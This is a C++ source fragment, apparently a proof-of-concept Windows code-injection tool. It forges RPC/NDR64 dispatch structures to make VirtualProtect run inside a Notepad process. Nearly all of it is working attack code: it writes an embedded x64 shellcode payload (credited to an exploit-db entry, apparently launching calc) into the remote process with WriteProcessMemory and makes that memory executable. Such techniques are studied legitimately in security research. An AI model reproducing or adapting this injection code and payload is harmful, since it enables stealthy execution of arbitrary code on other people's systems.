        (ULONG_PTR*)(tmpShellcode + 0x88 + sizeof(RPC_SERVER_INTERFACE) +
            sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
            sizeof(MIDL_SYNTAX_INFO) * 2 + sizeof(MIDL_STUB_DESC));
    NDR64_PROC_FORMAT* ProcStr0 =
        (NDR64_PROC_FORMAT*)(tmpShellcode + 0x88 +
            sizeof(RPC_SERVER_INTERFACE) +
            sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
            sizeof(MIDL_SYNTAX_INFO) * 2 +
            sizeof(MIDL_STUB_DESC) + sizeof(ULONG_PTR));

    //_NDR_PROC_CONTEXT Ndr+Proc
    DispatchTable0[0] = (PVOID)VirtualProtect;
    RpcSrvInfo0->DispatchTable =
        (SERVER_ROUTINE*)REMOTE_EDIT_ADDRESS(DispatchTable0);

    FmtStrOffset0[0] = (ULONG_PTR)REMOTE_EDIT_ADDRESS(ProcStr0);
    (SyntaxInfo0 + 1)->FmtStringOffset =
        (USHORT*)REMOTE_EDIT_ADDRESS(FmtStrOffset0);
    RpcSrvInfo0->pSyntaxInfo =
        (MIDL_SYNTAX_INFO*)REMOTE_EDIT_ADDRESS(SyntaxInfo0);
    RpcSrvInfo0->pStubDesc = (MIDL_STUB_DESC*)REMOTE_EDIT_ADDRESS(StubDesc0);
    RpcSrvInfo0->DispatchTable =
        (SERVER_ROUTINE*)REMOTE_EDIT_ADDRESS(DispatchTable0);
    // RpcSrvInfo0->FmtStringOffset = (unsigned short*)0x1337;
    RpcSrvInfo0->ProcString = (PFORMAT_STRING)0xAAAA;



    RpcInterfaceInfo0->InterpreterInfo =
        (MIDL_SERVER_INFO*)REMOTE_EDIT_ADDRESS(RpcSrvInfo0);
    RpcMsg0->RpcInterfaceInformation =
        (RPC_SERVER_INTERFACE*)REMOTE_EDIT_ADDRESS(RpcInterfaceInfo0);
    RpcMsg0->ProcNum = 0;
    RpcMsg0->RpcFlags = 0x1000;

    *(ULONG_PTR*)(tmpShellcode + 0x100) =
        (ULONG_PTR)VirtualProtect;



    auto calcOffset = 0x88 + sizeof(RPC_SERVER_INTERFACE) +
        sizeof(MIDL_SERVER_INFO) + sizeof(PVOID) +
        sizeof(MIDL_SYNTAX_INFO) * 2 + sizeof(MIDL_STUB_DESC) +
        sizeof(ULONG_PTR) + sizeof(NDR64_PROC_FORMAT);
    // auto remoteCallAddr = REMOTE_CLS_ADDRESS(tmpShellcode + calcOffset);
    //*(ULONG_PTR*)(tmpShellcode + calcOffset) = remoteCallAddr;
    // calcOffset += sizeof(ULONG_PTR);

    /*
    * https://github.com/ufwt/windows-XP-SP1/blob/d521b6360fcff4294ae6c5651c539f1b9a6cbb49/XPSP1/NT/com/rpc/ndr64/mulsyntx.cxx#L1152
    if (  pParamFlags->IsIn     ||
            (pParamFlags->IsReturn && !pNdr64Flags->HasComplexReturn) ||
            pParamFlags->IsPipe )
        continue;
    */
    std::vector<_NDR64_PARAM_FORMAT*> theParamTypeAddress;
    // type的指针,这个type会读两次 **typeaddr
    auto fnSetNdr64Param = [&]() {
        static auto currentCopyCount = 0;
        auto ndr64Param = (_NDR64_PARAM_FORMAT*)(tmpShellcode + calcOffset);
        ndr64Param->Attributes.IsIn = true;
        ndr64Param->Attributes.IsBasetype = true;
        // auto typeAddress = tmpShellcode + calcOffset;
        // theParamTypeAddress.push_back(typeAddress);
        // ndr64Param->Type = (void*)REMOTE_CLS_ADDRESS(typeAddress);
        ndr64Param->StackOffset = currentCopyCount * 4;
        currentCopyCount += 1;
        // 这个没用,因为不走IsSimpleRef,simpleref那段内存是read only没办法赋值
        // https://github.com/ufwt/windows-XP-SP1/blob/d521b6360fcff4294ae6c5651c539f1b9a6cbb49/XPSP1/NT/com/rpc/ndr64/srvcall.cxx#L694C31-L694C43
        //*(char*)(typeAddress) = (char)_Ndr64SimpleTypeBUfferSizeMap::kint64;
        // calcOffset += sizeof(_NDR64_PARAM_FORMAT);
        theParamTypeAddress.push_back(ndr64Param);
        calcOffset += sizeof(_NDR64_PARAM_FORMAT);
    };

    const auto virtualProtectParamSize = 8 * 4;
    for (size_t i = 0; i < virtualProtectParamSize / 4; i++) {
        fnSetNdr64Param();
    }
    auto paramsBuffer = tmpShellcode + calcOffset;
    // 设置参数
    RpcMsg0->Buffer = (void*)REMOTE_CLS_ADDRESS(paramsBuffer);
    RpcMsg0->BufferLength = virtualProtectParamSize;  // virtualprotect的参数
    calcOffset += RpcMsg0->BufferLength;

    // Make HandleType to 0
    ProcStr0->Flags = 1;
    ProcStr0->StackSize = virtualProtectParamSize;
    ProcStr0->NumberOfParams = RpcMsg0->BufferLength / 4;

    // https://www.exploit-db.com/shellcodes/49819
    //  没办法把shellcode写到cls内存里面,因为那个是map的属性.所以提前写到编辑框里面
    unsigned char payload[] =
        "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b"
        "\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
        "\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08"
        "\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
        "\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24"
        "\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
        "\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6"
        "\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
        "\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96"
        "\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
        "\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e"
        "\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
        "\x48\x83\xec\x20\x41\xff\xd6";

    PVOID embuf;
    SIZE_T numOfWrite;
    ReadProcessMemory(pi.hProcess, emh, &embuf, sizeof(ULONG_PTR), &numOfWrite);
    WriteProcessMemory(pi.hProcess, embuf, &TheNotepadTagClsAddress, 8,
        &numOfWrite);
    WriteProcessMemory(pi.hProcess, (char*)((uint64_t)embuf + 8), payload,
        sizeof(payload), &numOfWrite);
    const auto shellcodeAddress = (uint64_t)embuf + 8;
    const auto virtualProtectReturnValue = shellcodeAddress + sizeof(payload);
    const auto editShellcodeLocation = shellcodeAddress + sizeof(payload) + sizeof(uint64_t);

    auto tempCover = (uint64_t)TheNotepadTagClsAddress;
    memcpy(paramsBuffer, &tempCover, 8);

    tempCover = (uint64_t)sizeof(payload);
    memcpy(paramsBuffer + 8, &tempCover, 8);

    tempCover = (uint64_t)PAGE_EXECUTE_READWRITE;
    memcpy(paramsBuffer + 8 + 8, &tempCover, 8);

    memcpy(paramsBuffer + 8 + 8 + 8, &virtualProtectReturnValue, 8);
    calcOffset += sizeof(uint64_t);

    for (auto ndr64Param : theParamTypeAddress) {
        auto typeAddress = tmpShellcode + calcOffset;
        ndr64Param->Type = (void*)REMOTE_CLS_ADDRESS(typeAddress);
        calcOffset += sizeof(void*);

        *(char*)(typeAddress) = (char)_Ndr64SimpleTypeBUfferSizeMap::kint64;
        calcOffset += sizeof(char);
    }
}
int main() { wWinMain(0, 0, 0, 0); }
